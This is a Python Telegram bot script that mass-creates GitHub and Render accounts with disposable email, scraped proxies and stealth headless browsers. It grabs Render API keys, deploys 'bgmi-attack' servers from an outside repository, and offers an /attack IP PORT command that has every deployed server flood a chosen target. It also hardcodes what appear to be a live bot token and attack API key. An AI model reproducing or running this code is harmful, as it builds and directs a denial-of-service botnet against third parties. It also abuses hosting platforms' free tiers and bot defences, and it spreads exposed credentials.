#!/usr/bin/env python3
"""
Render Auto Account Creator Bot
Temp mail (GuerillaMail) -> GitHub -> Render OAuth -> Attack server -> Telegram
Flask /health endpoint keeps Render free tier alive.
"""

import asyncio
import json
import os
import re
import time
import random
import string
import requests
import threading
import urllib3
urllib3.disable_warnings()

from flask import Flask, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ── CONFIG ────────────────────────────────────────────────────────────
BOT_TOKEN          = os.environ.get("BOT_TOKEN", "8760402391:AAEMUwqyRjg-tcsiB8GY9WL-IoCZeAaG_08")
CHAT_ID            = int(os.environ.get("CHAT_ID", "7861390927"))
ATTACK_SERVER_REPO = "https://github.com/AzharKhan07115/battle-destroyer-backend"
ATTACK_API_KEY     = "3ecaaa2c71a979c39b7fc224670dd8a48bb58efd07b477ef1b91adba7a7e7977"
PORT               = int(os.environ.get("PORT", "8080"))

state = {
    "accounts":    [],
    "proxy_list":  [],
    "running":     False,
    "pending_otp": None,
    "mail_obj":    None,
}

# ── FLASK HEALTH (keeps Render alive) ─────────────────────────────────
flask_app = Flask(__name__)

@flask_app.route("/health")
def health():
    return jsonify({
        "status":   "ok",
        "accounts": len(state["accounts"]),
        "running":  state["running"],
        "proxies":  len(state["proxy_list"]),
    })

@flask_app.route("/")
def index():
    return jsonify({"bot": "render-auto-bot", "status": "running"})

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)

# ── SAFE TELEGRAM SEND ────────────────────────────────────────────────
async def safe_send(bot, text):
    try:
        await bot.send_message(chat_id=CHAT_ID, text=text)
    except Exception:
        pass

# ── GUERRILLAMAIL TEMP MAIL ───────────────────────────────────────────
class TempMail:
    BASE = "https://api.guerrillamail.com/ajax.php"

    def __init__(self):
        self.sid = None
        self.s   = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = "Mozilla/5.0"

    def generate(self):
        r = self.s.get(self.BASE, params={"f": "get_email_address"}, timeout=15)
        d = r.json()
        self.sid = d["sid_token"]
        email    = d["email_addr"].replace("\\@", "@")
        return email

    def wait_for_otp(self, timeout=180):
        seen = set()
        end  = time.time() + timeout
        while time.time() < end:
            try:
                r = self.s.get(
                    self.BASE,
                    params={"f": "get_email_list", "offset": 0, "sid_token": self.sid},
                    timeout=10
                )
                for msg in r.json().get("list", []):
                    mid = msg.get("mail_id")
                    if mid and mid not in seen:
                        seen.add(mid)
                        full = self.s.get(
                            self.BASE,
                            params={"f": "fetch_email", "email_id": mid, "sid_token": self.sid},
                            timeout=10
                        ).json()
                        body = full.get("mail_body", "") + full.get("mail_text", "")
                        m = re.search(r'\b(\d{6,8})\b', body)
                        if m:
                            return m.group(1)
            except:
                pass
            time.sleep(4)
        return None

# ── PROXY ─────────────────────────────────────────────────────────────
def fetch_proxies():
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ]
    proxies = []
    for u in urls:
        try:
            r = requests.get(u, timeout=12, verify=False)
            if r.status_code == 200:
                proxies += [l.strip() for l in r.text.split("\n") if l.strip() and ":" in l]
        except:
            pass
    state["proxy_list"] = list(set(proxies))
    return len(state["proxy_list"])

def get_proxy():
    if not state["proxy_list"]:
        fetch_proxies()
    random.shuffle(state["proxy_list"])
    for p in state["proxy_list"][:50]:
        try:
            r = requests.get(
                "http://httpbin.org/ip",
                proxies={"http": f"http://{p}", "https": f"http://{p}"},
                timeout=6, verify=False
            )
            if r.status_code == 200:
                return p
        except:
            pass
    return None

# ── HELPERS ───────────────────────────────────────────────────────────
def rand_pass():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "!9"

def rand_user():
    a = ["dark","swift","ghost","iron","quick","cyber","brave","steel"]
    n = ["wolf","fox","hawk","viper","blade","byte","ninja","storm"]
    return f"{random.choice(a)}{random.choice(n)}{random.randint(100,9999)}"

# ── GITHUB ACCOUNT ────────────────────────────────────────────────────
async def create_github(email, username, password, bot, mail_obj):
    try:
        from playwright.async_api import async_playwright
        from playwright_stealth import stealth_async
    except ImportError:
        await safe_send(bot, "playwright install karo:\npip install playwright playwright-stealth\nplaywright install chromium")
        return False

    proxy = get_proxy()
    pcfg  = {"server": f"http://{proxy}"} if proxy else None
    if proxy:
        await safe_send(bot, f"Proxy: {proxy}")

    async with async_playwright() as pw:
        br = await pw.chromium.launch(
            headless=True, proxy=pcfg,
            args=["--no-sandbox","--disable-setuid-sandbox",
                  "--disable-blink-features=AutomationControlled",
                  "--disable-dev-shm-usage","--disable-gpu"]
        )
        page = await br.new_page()
        await stealth_async(page)

        try:
            await safe_send(bot, "GitHub signup open...")
            await page.goto("https://github.com/signup", timeout=30000)
            await asyncio.sleep(2)

            await page.locator("#email").wait_for(timeout=10000)
            await page.locator("#email").fill(email)
            await asyncio.sleep(0.5)
            await page.keyboard.press("Enter")
            await asyncio.sleep(1)

            await page.locator("#password").wait_for(timeout=8000)
            await page.locator("#password").fill(password)
            await asyncio.sleep(0.5)
            await page.keyboard.press("Enter")
            await asyncio.sleep(1)

            await page.locator("#login").wait_for(timeout=8000)
            await page.locator("#login").fill(username)
            await asyncio.sleep(1)
            await page.keyboard.press("Enter")
            await asyncio.sleep(1)

            try:
                await page.locator("label:has-text('n')").first.click()
            except:
                pass
            await page.keyboard.press("Enter")
            await asyncio.sleep(1)

            await safe_send(bot, "Captcha wait 10s...")
            await asyncio.sleep(10)

            try:
                btn = page.locator("button:has-text('Create account')").first
                if await btn.count() > 0:
                    await btn.click()
                    await asyncio.sleep(3)
            except:
                pass

            # OTP
            await safe_send(bot, "OTP wait kar raha hu email mein...")
            otp = await asyncio.get_event_loop().run_in_executor(
                None, lambda: mail_obj.wait_for_otp(120)
            )

            if not otp:
                await safe_send(bot, "Auto OTP nahi aaya. /otp CODE bhejo.")
                for _ in range(40):
                    await asyncio.sleep(5)
                    if state["pending_otp"]:
                        otp = state["pending_otp"]
                        state["pending_otp"] = None
                        break

            if otp:
                await safe_send(bot, f"OTP: {otp}")
                inp = page.locator("input[name='otp'], input[autocomplete='one-time-code']").first
                if await inp.count() > 0:
                    await inp.fill(str(otp))
                    await page.keyboard.press("Enter")
                    await asyncio.sleep(3)

            final = page.url
            if "github.com" in final and "signup" not in final:
                await safe_send(bot, f"GitHub account bana: {username}")
                await br.close()
                return True
            else:
                await safe_send(bot, f"GitHub unclear. URL: {final[:80]}")
                await br.close()
                return False

        except Exception as e:
            await safe_send(bot, f"GitHub error: {str(e)[:150]}")
            await br.close()
            return False

# ── RENDER VIA GITHUB OAUTH ───────────────────────────────────────────
async def create_render(gh_email, gh_pass, bot):
    try:
        from playwright.async_api import async_playwright
        from playwright_stealth import stealth_async
    except ImportError:
        return None

    proxy = get_proxy()
    pcfg  = {"server": f"http://{proxy}"} if proxy else None

    async with async_playwright() as pw:
        br = await pw.chromium.launch(
            headless=True, proxy=pcfg,
            args=["--no-sandbox","--disable-setuid-sandbox",
                  "--disable-blink-features=AutomationControlled",
                  "--disable-dev-shm-usage","--disable-gpu"]
        )
        page = await br.new_page()
        await stealth_async(page)

        try:
            await safe_send(bot, "Render register open...")
            await page.goto("https://dashboard.render.com/register", timeout=30000)
            await asyncio.sleep(3)

            gh_btn = page.locator("a:has-text('GitHub'), button:has-text('GitHub')").first
            await gh_btn.wait_for(timeout=10000)
            await gh_btn.click()
            await asyncio.sleep(3)

            if "github.com" in page.url:
                await safe_send(bot, "GitHub login kar raha hu...")
                await page.fill("#login", gh_email)
                await page.fill("#password", gh_pass)
                await page.click("input[type='submit']")
                await asyncio.sleep(3)

            if "oauth" in page.url or "authorize" in page.url:
                btn = page.locator("button:has-text('Authorize'), input[value*='Authorize']").first
                if await btn.count() > 0:
                    await btn.click()
                    await asyncio.sleep(3)

            await asyncio.sleep(2)
            if "dashboard.render.com" in page.url and "login" not in page.url:
                await safe_send(bot, "Render account bana! API key le raha hu...")
                await page.goto("https://dashboard.render.com/account/api-keys", timeout=15000)
                await asyncio.sleep(2)

                new_btn = page.locator("button:has-text('Create API Key'), button:has-text('New API Key')").first
                if await new_btn.count() > 0:
                    await new_btn.click()
                    await asyncio.sleep(1)
                    name_in = page.locator("input[type='text']").first
                    if await name_in.count() > 0:
                        await name_in.fill("bot-key")
                    sub = page.locator("button:has-text('Create'), button[type='submit']").first
                    if await sub.count() > 0:
                        await sub.click()
                        await asyncio.sleep(2)
                    key_el = page.locator("code, input[readonly]").first
                    if await key_el.count() > 0:
                        k = (await key_el.inner_text()).strip()
                        if not k:
                            k = (await key_el.input_value()).strip()
                        if k and len(k) > 10:
                            await br.close()
                            return k

            await br.close()
            return None
        except Exception as e:
            await safe_send(bot, f"Render error: {str(e)[:150]}")
            await br.close()
            return None

# ── RENDER DEPLOY ─────────────────────────────────────────────────────
def render_deploy(api_key, num):
    hdrs = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
    owner_id = None
    try:
        r = requests.get("https://api.render.com/v1/owners?limit=1", headers=hdrs, timeout=15)
        if r.status_code == 200 and r.json():
            owner_id = r.json()[0]["owner"]["id"]
    except:
        pass
    if not owner_id:
        return None, None

    payload = {
        "type": "web_service",
        "name": f"bgmi-attack-{num}",
        "ownerId": owner_id,
        "repo": ATTACK_SERVER_REPO,
        "branch": "main",
        "rootDir": "attack-server",
        "plan": "free",
        "region": "singapore",
        "runtime": "docker",
        "envVars": [
            {"key": "ATTACK_API_KEY", "value": ATTACK_API_KEY},
            {"key": "PORT",           "value": "8080"},
        ],
        "autoDeploy": "yes",
    }
    try:
        r = requests.post("https://api.render.com/v1/services", headers=hdrs, json=payload, timeout=20)
        if r.status_code in [200, 201]:
            d   = r.json()
            sid = d.get("service", {}).get("id", "")
            url = d.get("service", {}).get("serviceDetails", {}).get("url") or \
                  f"https://bgmi-attack-{num}.onrender.com"
            return url, sid
    except:
        pass
    return None, None

# ── FULL AUTO ─────────────────────────────────────────────────────────
async def full_auto(bot):
    mail     = TempMail()
    username = rand_user()
    password = rand_pass()

    await safe_send(bot, "Temp email bana raha hu...")
    try:
        email = mail.generate()
        state["mail_obj"] = mail
    except Exception as e:
        await safe_send(bot, f"Temp mail fail: {str(e)[:200]}")
        return

    await safe_send(bot,
        f"Email: {email}\nUsername: {username}\nPassword: {password}"
    )

    await safe_send(bot, "--- Step 1: GitHub ---")
    ok = await create_github(email, username, password, bot, mail)
    if not ok:
        await safe_send(bot,
            "GitHub fail.\nCaptcha ya IP issue.\n/auto se dobara try karo."
        )
        return

    await asyncio.sleep(5)

    await safe_send(bot, "--- Step 2: Render ---")
    rkey = await create_render(email, password, bot)
    if not rkey:
        await safe_send(bot,
            f"Render API key nahi mila.\n"
            f"GitHub bana:\nEmail: {email}\nPass: {password}\n"
            f"Manually render.com pe GitHub se signup karo."
        )
        return

    await safe_send(bot, "--- Step 3: Deploy ---")
    num = len(state["accounts"]) + 1
    svc_url, svc_id = await asyncio.get_event_loop().run_in_executor(
        None, lambda: render_deploy(rkey, num)
    )

    if svc_url:
        acc = {
            "num": num, "email": email,
            "service_url": svc_url, "service_id": svc_id or "",
            "attack_api_key": ATTACK_API_KEY,
        }
        state["accounts"].append(acc)
        try:
            with open("accounts.json", "w") as f:
                json.dump(state["accounts"], f, indent=2)
        except:
            pass
        await safe_send(bot,
            f"Account #{num} READY!\n\n"
            f"Server: {svc_url}\n"
            f"Key: {ATTACK_API_KEY}\n\n"
            f"Deploy ~5 min. /test {svc_url}"
        )
    else:
        await safe_send(bot, f"Render deploy fail.\nAPI key: {rkey}")

# ── COMMANDS ──────────────────────────────────────────────────────────
async def cmd_start(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    await u.message.reply_text(
        "Render Auto Bot\n\n"
        "/auto - full auto\n"
        "/otp CODE - manual OTP daal\n"
        "/status - accounts list\n"
        "/servers - attack URLs\n"
        "/test [url] - health check\n"
        "/attack IP PORT [sec] - flood\n"
        "/proxies - fresh proxies load"
    )

async def cmd_auto(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    if state["running"]:
        await u.message.reply_text("Pehla chal raha hai...")
        return
    state["running"] = True
    await u.message.reply_text("Full auto shuru!")
    bot = ctx.bot
    async def run():
        try:
            await full_auto(bot)
        finally:
            state["running"] = False
    asyncio.create_task(run())

async def cmd_otp(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    if not ctx.args:
        await u.message.reply_text("Usage: /otp CODE")
        return
    state["pending_otp"] = ctx.args[0]
    await u.message.reply_text(f"OTP set: {ctx.args[0]}")

async def cmd_status(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    if not state["accounts"]:
        try:
            with open("accounts.json") as f: state["accounts"] = json.load(f)
        except: pass
    await u.message.reply_text(
        f"Accounts: {len(state['accounts'])}\n"
        f"Proxies: {len(state['proxy_list'])}\n"
        f"Running: {'Yes' if state['running'] else 'No'}"
    )

async def cmd_servers(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    if not state["accounts"]:
        try:
            with open("accounts.json") as f: state["accounts"] = json.load(f)
        except: pass
    if not state["accounts"]:
        await u.message.reply_text("Koi server nahi. /auto se banao.")
        return
    msg = "Attack Servers:\n\n"
    for a in state["accounts"]:
        msg += f"#{a['num']} {a['service_url']}\n"
    msg += f"\nKey: {ATTACK_API_KEY}"
    await u.message.reply_text(msg)

async def cmd_proxies(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    await u.message.reply_text("Fetch kar raha hu...")
    count = await asyncio.get_event_loop().run_in_executor(None, fetch_proxies)
    await u.message.reply_text(f"{count} proxies ready!")

async def cmd_test(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    if ctx.args:
        urls = [ctx.args[0].rstrip('/')]
    else:
        if not state["accounts"]:
            try:
                with open("accounts.json") as f: state["accounts"] = json.load(f)
            except: pass
        urls = [a["service_url"] for a in state["accounts"]]
        if not urls:
            urls = ["https://bgmi-attack-server.onrender.com"]
    for url in urls:
        try:
            r = requests.get(f"{url}/health", timeout=10, verify=False)
            d = r.json()
            status = "OK" if d.get("binary_ready") else "WARN"
            await u.message.reply_text(
                f"[{status}] {url}\nbinary: {d.get('binary_ready')}\nactive: {d.get('active_attacks',0)}"
            )
        except Exception as e:
            await u.message.reply_text(f"[FAIL] {url}\n{str(e)[:80]}")

async def cmd_attack(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.id != CHAT_ID: return
    args = ctx.args or []
    if len(args) < 2:
        await u.message.reply_text("Usage: /attack IP PORT [seconds]")
        return
    ip       = args[0]
    port     = int(args[1])
    duration = int(args[2]) if len(args) > 2 else 60

    if not state["accounts"]:
        try:
            with open("accounts.json") as f: state["accounts"] = json.load(f)
        except: pass

    servers = [(a["service_url"], a.get("attack_api_key", ATTACK_API_KEY)) for a in state["accounts"]]
    servers.append(("https://bgmi-attack-server.onrender.com", ATTACK_API_KEY))

    launched = 0
    for url, key in servers:
        url = url.rstrip('/')
        try:
            r = requests.post(
                f"{url}/start-server",
                headers={"x-api-key": key, "Content-Type": "application/json"},
                json={"ip": ip, "port": port, "duration": duration, "threads": 50},
                timeout=8, verify=False
            )
            if r.json().get("launched") == 1:
                launched += 1
        except:
            pass

    await u.message.reply_text(
        f"Attack {'LAUNCHED' if launched else 'FAILED'}\n"
        f"Target: {ip}:{port}\n"
        f"Duration: {duration}s\n"
        f"Servers: {launched}/{len(servers)}\n"
        f"Threads: {launched * 50}"
    )

# ── MAIN ──────────────────────────────────────────────────────────────
def main():
    print(f"[*] Starting Flask on port {PORT}...")
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    print("[*] Bot starting...")
    threading.Thread(target=fetch_proxies, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("auto",    cmd_auto))
    app.add_handler(CommandHandler("otp",     cmd_otp))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("servers", cmd_servers))
    app.add_handler(CommandHandler("proxies", cmd_proxies))
    app.add_handler(CommandHandler("test",    cmd_test))
    app.add_handler(CommandHandler("attack",  cmd_attack))
    print("[*] Ready!")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
